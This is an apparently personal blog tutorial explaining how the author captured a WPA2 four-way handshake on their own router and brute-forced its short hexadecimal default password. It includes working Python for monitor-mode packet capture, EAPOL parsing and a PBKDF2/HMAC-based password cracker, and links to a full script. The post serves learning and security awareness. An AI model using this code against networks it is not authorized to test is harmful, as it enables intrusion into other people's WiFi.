+++
title = "Break WiFi with Python"
date = 2018-02-24T12:00:00-05:00
draft = false
+++

*Most of the information here I learned from reading other blogs and looking
at diagrams online. I don't claim to be an expert on anything here, this is
just what worked for me, so if there are any inaccuracies, feel free to let me
know! This is for learning purposes only, there are already tools that can do
all of this much better than anything I can make.*

I got a new wireless router the other day from my internet service provider,
which uses WPA2 security with a pretty short default WiFi password.
I'm pretty interested in digital security, so I was curious as to how difficult
it would be for someone to break into my network if I had simply set up the
router as delivered. As it turns out, it's not actually that hard, and can be
done with a short Python script.

When a device connects to a wireless network, a sequence of four messages is
exchanged between the connecting device and the wireless access point, called
a four way handshake. The four way handshake is how the device authenticates
itself to join the network, and sets up encryption between the device and the
wireless access point. The four way handshake is not encrypted though, and can
be viewed by anyone listening for WiFi packets since the packets are all sent
out over the open air. If someone records the four way handshake, then they have
enough information to guess at what the WiFi password.

This means the steps I needed to do were:

- Get raw wireless packets
- Filter out the ones not related to my own network (I'm not trying to break
into other peoples networks here)
- Watch these packets until I capture a four way handshake
- Brute force the WiFi password from the information contained in the four way
handshake messages

## Step 1 - Capture some packets
Probably the most interesting thing I discovered was just how easy it is to
capture wireless packets. Many wireless chips support a monitoring mode, where
they basically just capture any WiFi packets that they observe. To put my
wireless card into monitoring mode I had to enable promiscuous mode on the
interface (in this case mine was `wlp2s0`) using

```Bash
sudo ifconfig wlp2s0 promisc
```

and then temporarily shutdown the interface while the monitoring command is run.

```Bash
sudo ifconfig wlp2s0 down
sudo iwconfig wlp2s0 mode monitor
sudo ifconfig wlp2s0 up
```

Once the interface is in monitoring mode, a socket can be created to read the
frames and process the data. The socket is created as a raw socket, with the
packet address family.

```Python
import socket

# create a raw socket
sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))

# read and print the packet as hexadecimal
packet = sock.recvfrom(2048)[0]
print(packet.hex())
```

At this point all the WiFi packets floating around near my computer can be
accessed from within the Python script!

Basic parsing of the packets is also pretty simple. Certain WiFi cards will
prepend a "radiotap" header to the actual 802.11 frames, which looks like:

- 2 bytes: radiotap header version
- 1 byte: length of the radiotap header (n + 3)
- n bytes: the actual radiotap header

The header doesn't contain anything I needed, so I just looked for the header
and discarded it after checking the length, leaving me with the plain packet.
The packet itself takes the form of:

- 2 bytes: frame control, which indicates what type of frame it is
- 2 bytes: duration of the packet
- 6 bytes: address 1
- 6 bytes: address 2
- 6 bytes: address 3
- 2 bytes: sequence control
- 6 bytes: address 4
- n bytes: payload of the frame
- 4 bytes: cyclic redundancy check, to make sure the frame data isn't corrupted

For some reason I found some packets that only consisted of four 0 bytes, which
I just ignored. This is the whole thing codeified in Python:

```Python
if packet[0:2] == b'\x00\x00': # radiotap header version 0
    radiotap_header_length = int(packet[2])
    packet = packet[radiotap_header_length:] # strip off radiotap header
    if packet != b'\x00\x00\x00\x00': # ignore the 0 packets
        frame_ctl = packet[0:2]
        duration = packet[2:4]
        address_1 = packet[4:10]
        address_2 = packet[10:16]
        address_3 = packet[16:22]
        sequence_control = packet[22:24]
        address_4 = packet[24:30]
        payload = packet[30:-4]
        crc = packet[-4:]
```

At this point the most important field is the `frame_ctl` field, since it
tells you what type of frame you are working with. I defined a couple of
constants to compare it against. [Here is a great site][1] I used to figure out
what each `frame_ctl` field meant.

```Python
BEACON_FRAME = b'\x80\x00'
ASSOCIATION_RESP_FRAME = b'\x10\x00'
HANDSHAKE_AP_FRAME = b'\x88\x02' # handshake message from access point (AP)
HANDSHAKE_STA_FRAME = b'\x88\x01' # handshake message from connecting device (STA)
```

## Step 2 - Filter out everything else
Another cool thing I learned is how your computer or phone discovers wireless
access points. Each access point actually sends out "Beacon frames" quite
often, with their MAC address and the SSID that they represent.
So since I know the name of my network, I just need to wait until I find a
beacon frame with that SSID in the payload and get the MAC address of the
wireless access point. Then I can just filter out all further packets based on that MAC
address by checking if either `address_1` or `address_2` is equal to that value.
It's not particularly elegant code, but it works well enough.

```Python
if ap_mac is None and frame_ctl == BEACON_FRAME and SSID in str(payload):
    ap_mac = address_2
elif ap_mac is not None and (address_1 == ap_mac or address_2 == ap_mac):
...
```

I was really amazed at how many beacon frames there were! Even from my own
router there are enough to fill up my screen in a few seconds.

## Step 3 - Capture a four way handshake
Now that I was only capturing relevant packets, I had to identify a handshake.
It's easy to spot, since and association request and response occur just before
as the device lets the access point know that it wants to connect. All it takes
is a look at the `frame_ctl` field again to look for the association response
from the router.

```Python
if frame_ctl == ASSOCIATION_RESP_FRAME:
     association_init = True
     sta_mac = address_1
```

Here, the `sta_mac` field is the MAC address of the connecting device (station).
It will be needed later on with the `ap_mac` field to find the password to the
access point.

Once the association is initiated, the next packets should contain the
handshake. The `frame_ctl` field can be checked once again to verify that the
frame is part of the handshake, then the payload of the frame needs to be
parsed. The payload for the handshake frames contain 4 bytes to identify the
link layer, and the rest forms an 'EAPol' (Extensible Authentication Protocol
Over LA) frame. The EAPol frame needs to be decoded as follows:

- 1 byte: version
- 1 byte: EAPol frame type
- 2 bytes: body length
- 1 byte: key type
- 2 bytes: key info
- 2 bytes: key length
- 8 bytes: replay counter
- 32 bytes: nonce
- 16 bytes: key iv
- 8 bytes: key rsc
- 8 bytes: key id
- 16 bytes: key message integrity code
- 2 bytes: WPA key length (n)
- n bytes: WPA key

In order to try to compute with WiFi password, four values need to be obtained
from the handshake messages:

- the nonce in the first message
- the nonce in the second message
- the MIC from the fourth message
- the whole EAPol frame from the fourth message, with the MIC field replaced by
zeroes

The access point MAC address and the connecting device MAC address that were
saved at the beginning of this step are passed to a function along with these
four values that does the actual computation of the WiFi password.

```Python
association_init: #Association initiated, look for 4-way handshake
    if frame_ctl == HANDSHAKE_AP_FRAME or frame_ctl == HANDSHAKE_STA_FRAME:
        handshake_counter += 1
        print('Received handshake {} of 4'.format(handshake_counter))

        eapol_frame = payload[4:] #remove link layer

        version = eapol_frame[0]
        eapol_frame_type = eapol_frame[1]
        body_length = eapol_frame[2:4]
        key_type = eapol_frame[4]
        key_info = eapol_frame[5:7]
        key_length = eapol_frame[7:9]
        replay_counter = eapol_frame[9:17]
        nonce = eapol_frame[17:49]
        key_iv = eapol_frame[49:65]
        key_rsc = eapol_frame[65:73]
        key_id = eapol_frame[73:81]
        mic = eapol_frame[81:97]
        wpa_key_length = eapol_frame[97:99]
        wpa_key = eapol_frame[99:]

        if handshake_counter == 1 and frame_ctl == HANDSHAKE_AP_FRAME:
            ap_nonce = nonce
        elif handshake_counter == 2 and frame_ctl == HANDSHAKE_STA_FRAME:
            sta_nonce = nonce
        elif handshake_counter == 3 and frame_ctl == HANDSHAKE_AP_FRAME:
            continue
        elif handshake_counter == 4 and frame_ctl == HANDSHAKE_STA_FRAME:
            eapol_frame_zeroed_mic = b''.join([
                eapol_frame[:81],
                b'\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0',
                eapol_frame[97:99]
            ])

            print('Attempting to find password...')
            crack_wpa(ap_mac, sta_mac, ap_nonce, sta_nonce, eapol_frame_zeroed_mic, mic)
        else: # reset all variables
            association_init = False
            handshake_counter = 0
            ap_mac = None
            sta_mac = None
            ap_nonce = None
            sta_nonce = None
```

## Step 4 - Brute force the password
The last step is the implementation of the `crack_wpa` function. This is where
all of the information from the previous step is used to make guesses at what
the WiFi password could be. The way this is done is by using the information
obtained from the handshake messages and a guess at the password to calculate
a MIC, and compare that MIC with the one from the handshake. If the MICs are
the same, then the password guess was correct! The function does the following:

1. Use a guess at the password to calculate a PMK (public master key). This is
easy to calculate if you know the WiFi password, but in this situation all you
can really do is make a guess and calculate the PMK with that guess.

2. Combine the MACs and nonces for both of the access points with constants to
create a message.

3. Take the HMAC SHA1 of the message, using the guessed PMK as a seed. The
first 16 bytes of this hash is the KCK (key confirmation key).

4. Take the HMAC SHA1 of the EAPol frame (the one with the MIC field zeroed),
using the KCK as the seed. The first 16 bytes of this value is the calculated
MIC!

5. Compare the calculed MIC with the MIC from the handshake, and if they match,
then the password guess in step 1 was correct! Otherwise, repeat the same
steps with a different guess.

I found [this PDF][2], and [this stack exchange question][3] helpful when trying
to figure out what the exact steps were.  Here is what I came up with to do
this calculation:

```Python
# check all passwords that are 8 hex character strings
PASSWORD_LIST = itertools.product('0123456789ABCDEF', repeat=8)

def crack_wpa(ap_mac, sta_mac, ap_nonce, sta_nonce, eapol_frame_zeroed_mic, mic):

    # sorting function for byte strings
    def sort(in_1, in_2):
        if len(in_1) != len(in_2):
            raise 'lengths do not match!'
        in_1_byte_list = list(bytes(in_1))
        in_2_byte_list = list(bytes(in_2))

        for i in range(0, len(in_1_byte_list)):
            if in_1_byte_list[i] < in_2_byte_list[i]:
                return (in_2, in_1) # input 2 is bigger
            elif in_1_byte_list[i] > in_2_byte_list[i]:
                return (in_1, in_2) # input 1 is bigger
        return (in_1, in_2) # equal (shouldn't happen)

    max_mac, min_mac = sort(ap_mac, sta_mac)
    max_nonce, min_nonce = sort(ap_nonce, sta_nonce)

    message = b''.join([
        b'Pairwise key expansion\x00',
        min_mac,
        max_mac,
        min_nonce,
        max_nonce,
        b'\x00'
    ])

    for password_guess in PASSWORD_LIST: # try all the passwords
        password_guess = ''.join(password_guess).encode()

        pmk = hashlib.pbkdf2_hmac('sha1', password_guess, SSID.encode(), 4096, 32)
        kck = hmac.new(pmk, message, hashlib.sha1).digest()[:16]
        calculated_mic = hmac.new(kck, eapol_frame_zeroed_mic, hashlib.sha1).digest()[:16]

        if calculated_mic == mic:
            print('The password is: {}'.format(password_guess.decode('ASCII')))
            sys.exit(0)

    print('The password was not found')
    sys.exit(1)
```

At this point all of the code is written! You can find the full Python script
on my GitHub [here](https://github.com/jordanhatcher/python-wpa2-cracker).

## Conclusion
As you can see, it could take many guesses to find the password to the WiFi
network. However, since the format of the default password to my router looks
like it is just 8 hexadecimal characters, that means there are only about 4
billion different combinations to check. Just using this unoptimized script on
my desktop, it would only take ~50 days go through the whole password list at a rate
of about 1000 guesses per second. With some serious optimizations (probably not
using Python for instance), and using
faster hardware or GPUs, a password like this could probably be calculated in
a few hours. In any case, I thought it was cool to see how fast it could be
done with a simple Python script and some research! I had a lot of fun with
this project, and learned a ton about how WiFi works by playing around with it!

Questions or comments? Feel free to email me or send me a message on
[twitter](https://twitter.com/jrdhtc)!

## References
1. [Breaking Down 802.11 Frame][1]
2. [Wireless Pre-Shared Key Cracking (WPA, WPA2)][2]
3. [How exactly does 4-way handshake cracking work?][3]

[1]: https://curiouswaves.blog/2017/10/29/breaking-down-802-11-frame/
[2]: http://www.og150.com/assets/Wireless%20Pre-Shared%20Key%20Cracking%20WPA,%20WPA2.pdf
[3]: https://security.stackexchange.com/questions/66008/how-exactly-does-4-way-handshake-cracking-work
